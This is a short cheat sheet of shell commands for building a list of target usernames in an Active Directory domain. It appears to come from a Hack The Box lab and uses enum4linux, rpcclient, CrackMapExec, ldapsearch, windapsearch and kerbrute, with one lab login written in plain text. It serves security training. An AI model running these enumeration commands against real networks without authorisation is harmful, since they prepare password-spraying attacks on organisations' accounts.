
Making a Target User List
```bash
# Using enum4linux - extract usernames from an SMB server
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# Using rpcclient to extract usernames from server
rpcclient -U "" -N 172.16.5.5
> enumdomusers 

# Using CrackMapExec --users Flag
crackmapexec smb 172.16.5.5 --users

# Users with LDAP Anonymous - Using Idapsearch
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

# Users with LDAP Anonymous - Using windapsearch
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

# Kerbrute User Enumeration
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

# Using CrackMapExec with Valid Credentials
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```